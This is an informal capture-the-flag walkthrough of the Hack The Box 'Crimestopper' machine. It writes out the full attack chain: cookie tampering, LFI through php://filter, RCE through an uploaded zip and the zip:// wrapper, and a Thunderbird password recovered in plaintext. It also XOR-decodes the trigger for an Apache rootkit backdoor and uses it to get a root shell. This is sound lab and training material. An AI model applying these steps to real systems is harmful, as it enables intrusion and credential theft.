## Notes for solving the Crimestopper machine in Hack The Box

This is not the "official" walkthrough, just my personal notes about solving the machine.

# Let's nmap


```
# Nmap 7.60 scan initiated Thu Apr 12 02:37:33 2018 as: nmap -sC -sV -oA initial_nmap 10.10.10.80
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.10.80
Host is up (0.00036s latency).
Not shown: 624 closed ports, 375 filtered ports
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped
```

Okay, let's see the app then.

# Abusing the PHP app


## Cookie abuse

modify cookie admin=1 -> there is an operation list available.

## whiterose.txt

name in list is not the same as secretname for this file. For user files it's the same. hmm
```<li><a href="?op=view&secretname=whiterose.txt">Whiterose.txt</a></li>```


" Your Tip:
Hello, <br /> You guys should really learn to code, one of the GET Parameters is still vulnerable. Most will think it just leads to a Source Code disclosure but there is a chain that provides RCE. <br /> Contact WhiteRose@DarkArmy.htb for more info."

Ok.

--

# Abusing op parameter


```
GET /?op=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%  25%5c%2e%2e%25%5c%2e%2e%255cboot%2eini&secretname=whiterose.txt HTTP/1.1
Host: 10.10.10.80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.80/?op=list
Cookie: admin=1:cmd=id; PHPSESSID=0eo09a350781pkof48qak95vv5
Connection: close
Upgrade-Insecure-Requests: 1
```

-- > http 400 bad request
where did the <script> come from? not from the request. Hmm it's always there ..

```
Content-Disposition: form-data; name="tip"
 l1ä2ö€LÖÄASL_;:X;ZC:;MQ^PWRQ*QWÄRÖÄ>Ä<,m<.m<,.m.tm23&"#%:"#_%:_"#::MS_MWET_ÖWE:WET:

..> 
Your Tip:<br /> l1&auml;2&ouml;&euro;L&Ouml;&Auml;ASL_;:X;ZC:;MQ^PWRQ*QW&Auml;R&Ouml;&Auml;&gt;&Auml;&lt;,m&lt;.m&lt;,.m.tm23&amp;&quot;#%:&quot;#_%:_&quot;#::MS_MWET_&Ouml;WE:WET:</script>
```

So after all kinds of tests, apparently no injection problems.

## What about LFI? 

```
GET /?op=view&secretname=0 -> 302
GET /?op=view&secretname=00 -> 200
```

op parameter references a file name

so we have at least these source files:
* list.php
* upload.php
* index.php
* home.php
* view.php


getting the source code: PHP://filter LFI
```http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index```

Download the rest.

## After downloading the source files

What can we control in the execution of the application?


### !!! USERAGENT is user controlled

```
// If the hacker cannot control the filename, it's totally safe to let them write files... Or is it?
function genFilename() {
        return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
```

hmm

### !!! $token is user controlled in upload.php
```
        <input type="text" id="token" name="token" style="display: none" value="<?php echo $token; ?>" style="width:355px;" />
```        
hmm

```
      foreach (scandir("uploads/" . $_SERVER['REMOTE_ADDR']) as $file) {
        if (!preg_match('(\.)', $file)) {
          echo "<li><a href=\"?op=view&secretname=" . $file . "\">" . $file . "</a></li>";
```
      
### !!! upload location is.. 

http://10.10.10.80/uploads/IP-ADDRESS/

```
                $tip = $_POST['tip'];
                $secretname = genFilename();
                file_put_contents("uploads/". $client_ip . '/' . $secretname,  $tip);
```

index.php

### !!! $op is user controlled

```
page_top($op);

if(!(include $op . '.php'))
    fatal('no such page');
?>
```

So, the comment definitely implies something. And luckily there is a phar and zip filter RCE trick! Let's go with the zip one.

# PHP ZIP filter trick for RCE

A phar would also (probably, depends on the settings, work but this is easier). Let's create a zip file containing some executable PHP stuff. Then use LFI with the zip filter to excute it.

How to keep the payload valid?

```
curl -vvv -b cookies  -X POST --form submit=je --form tip=@cooler.zip --form name=kik --form token=41fd619bf64826110a46c8e77780f944f66716f6ef71c00e87d4718380ecaecc  "http://10.10.10.80/?op=upload"      
-x http://localhost:8510
     
http://10.10.10.80/?op=zip://uploads/10.10.15.237/0a75ffc8c72ef5231be834641e3350c8b6a252c0#infopay
http://10.10.10.80/?op=zip://uploads/10.10.15.237/0a75ffc8c72ef5231be834641e3350c8b6a252c0#infopay
10.10.15.159/9ae1a2c8a3a884b4f363219d6004f2844d769eea
```

hmm zip is broken in transit :(

```
http://10.10.10.80/?op=zip://uploads/10.10.15.237/619f839a5d6637c39f27355d1a0c99cb3ffeaeaf%23infopay
http://10.10.10.80/?op=zip://uploads/10.10.15.237/490e25c8bbc83ba9fc6cbb681ef235ce306405ec%23phpbash
http://10.10.10.80/?op=zip://uploads/10.10.15.237/bd6f9b93d9c5bc18c0db86bae86d28836518afd6%23shell
```

But, let's route through proxy:
```
curl -vvv -b cookies -x http://localhost:8510  -X POST --form submit=je --form tip=@cooler.zip --form name=kik --form token=41fd619bf64826110a46c8e77780f944f66716f6ef71c00e87d4718380ecaecc  "http://10.10.10.80/?op=upload"
```

In the proxy, remove filename etc. -> works :) Then request the uploaded "tip" and finally we found RCE and got a reverse shell!

# Reverse shell reveals

Fixing the terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
cat super-secret-credits-random-stuff
This was inspired/modified from the 2016 Plaid CTF (Web Pixel Shop), I hope you enjoyed it!  Best of luck getting root.

- IppSec
```

there is 
```/home/dom/.thunderbird```

and at port 5355 something is listening, not visible to outside world

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -         
```

From /home/dom/.thunderbird we can deduce that it's probably imap server that is running on the localhost 5535.
Okay, so let's try the Thunderbird then. Some emails.

# Looking at the Thunderbird mails

less logins.json 

```
{"nextId":3,"logins":[{"id":1,"hostname":"imap://crimestoppers.htb","httpRealm":"imap://crimestoppers.htb","formSubmitURL":null,"usernameField":"","passwordField":"","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECD387WcBe3c6BBi1iFK/aDf9PjB/6ThOEBJQqjtekeU32Mo=","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHL1/2x89aL9BBA599gqEL19OHxdrsYIeFMr","guid":"{ac644add-759f-42ff-9337-0a60df088966}","encType":1,"timeCreated":1513452233268,"timeLastUsed":1513452233268,"timePasswordChanged":1513452233268,"timesUsed":1},{"id":2,"hostname":"smtp://crimestoppers.htb","httpRealm":"smtp://crimestoppers.htb","formSubmitURL":null,"usernameField":"","passwordField":"","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECJt3sgMddDmBBBiBLG1+xV56msveHf6TeQJyEbYeKiHnUl0=","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCtQjFNTfgl4BBCVOJjKsfEms5eVn1ohSZHC","guid":"{541c134f-1fb3-4a61-b920-b0bbdeff31cb}","encType":1,"timeCreated":1513452233274,"timeLastUsed":1513452233274,"timePasswordChanged":1513452233274,"timesUsed":1}],"disabledHosts":[],"version":2}
```

Okay,  let's crach some hashes or something (I don't remember anymore what I did in this point)

```
Website:   imap://crimestoppers.htb
Username: 'dom@crimestoppers.htb'
Password: 'Gummer59'

Website:   smtp://crimestoppers.htb
Username: 'dom@crimestoppers.htb'
Password: 'Gummer59'
```



Admin is always a nice group to read logs.
 
```
groups
dom adm cdrom sudo dip plugdev lpadmin sambashare


Dec 22 09:11:03 ubuntu Rootkit Hunter: Rootkit hunter check started (version 1.4.2)
Dec 22 09:12:23 ubuntu Rootkit Hunter: Scanning took 1 minute and 19 seconds
Dec 22 09:12:23 ubuntu Rootkit Hunter: Please inspect this machine, because it may be infected.
```

Why would you  run rkhunter in HTB machine? Not usual.

And what's in the email.

```
cat ImapMail/crimestoppers.htb/INBOX
From - Sat Dec 16 11:47:00 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: WhiteRose@DarkArmy.htb
Received: from [172.16.10.153] (ubuntu [172.16.10.153])
	by DESKTOP-2EA0N1O with ESMTPA
	; Sat, 16 Dec 2017 14:46:57 -0500
To: dom@CrimeStoppers.htb
From: WhiteRose <WhiteRose@DarkArmy.htb>
Subject: RCE Vulnerability
Message-ID: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Date: Sat, 16 Dec 2017 11:46:54 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

Hello,

I left note on "Leave a tip" page but no response.  Major vulnerability 
exists in your site!  This gives code execution. Continue to investigate 
us, we will sell exploit!  Perhaps buyer will not be so kind.

For more details place 1 million ecoins in your wallet.  Payment 
instructions will be sent once we see you move money.
```

How scary!

# Reverse engineering the rootkit

This was perhaps the coolest part of the machine. I enjoyed every bit of this challenge, but this was cool.

```
 ls -altr /etc/apache2/mods_available
 -rw-r--r-- 1 root root    64 Dec 16 12:37 rootme.load
``` 

hmm! enabled and loaded!


```
nc localhost 80
get root
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.25 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
```

## The original exploit doesn't work.

Original exploit's source code can be found in the internet. There we see how it's supposed to work.

```
#define HIDE_SHELL      "/usr/sbin/apache2 -k start"
#define ROOT_KEY        "root"
#define ROOT_KEY2       "root+"

GET root HTTP/1.0

GET /root HTTP/1.0
Host: localhost
<empty line>
```

Well, obviously it would've been too easy.

### Using radare2 we find

Here's the "authorization" checking. 

```
.rodata:0000000000001BF2 unk_1BF2        db  0Eh                 ; DATA XREF: darkarmy+E↑o
.rodata:0000000000001BF3                 db  14h
.rodata:0000000000001BF4                 db  0Dh
.rodata:0000000000001BF5                 db  38h ; 8
.rodata:0000000000001BF6                 db  3Bh ; ;
.rodata:0000000000001BF7                 db  0Bh
.rodata:0000000000001BF8                 db  0Ch
.rodata:0000000000001BF9                 db  27h ; '
.rodata:0000000000001BFA                 db  1Bh
.rodata:0000000000001BFB                 db    1
.rodata:0000000000001BFC                 db    0
```

Okay, this is 'HackTheBox' and XOR operation. 

We could do that in radare, but perhaps easier to just write a small Python script.

Like this, *decrypt.py*:

```
s1 = "HackTheBox"

#.rodata:0000000000001BF2 unk_1BF2        db  0Eh                 ; DATA XREF: darkarmy+E
#.rodata:0000000000001BF3                 db  14h
#.rodata:0000000000001BF4                 db  0Dh
#.rodata:0000000000001BF5                 db  38h ; 8
#.rodata:0000000000001BF6                 db  3Bh ; ;
#.rodata:0000000000001BF7                 db  0Bh
#.rodata:0000000000001BF8                 db  0Ch
#.rodata:0000000000001BF9                 db  27h ; '
#.rodata:0000000000001BFA                 db  1Bh
#.rodata:0000000000001BFB                 db    1
#.rodata:0000000000001BFC                 db    0


s2 = '\x0e\x14\x0d\x38\x3b\x0b\x0c\x27\x1b\x01\x00'

pas=''
for i in range(0,10):
  pas = pas +  chr(ord(s1[i]) ^ ord(s2[i]))
print(pas)
```

And run it:

```
python decrypt.py 
FunSociety
```

So this looks good.

# Finally getting root!

So now, let's go for the rootkit.

```
dom@ubuntu:~$ nc localhost 80
nc localhost 80
GET FunSociety HTTP/1.0
GET FunSociety HTTP/1.0


rootme-0.5 DarkArmy Edition Ready

whoami
root
cat /root/root.txt
91bb7714c560e0e885e049c2f579644a


cat /root/Congratulations.txt
Hope you enjoyed the machine! The root password is crackable, but I would be surprised if anyone managed to crack it without watching the show.  But who knows it is DESCrypted after all so BruteForce is possible.

Oh and kudo's if you just SSH'd in via IPv6 once you got dom's pw :)

-Ippsec

```


DONE!



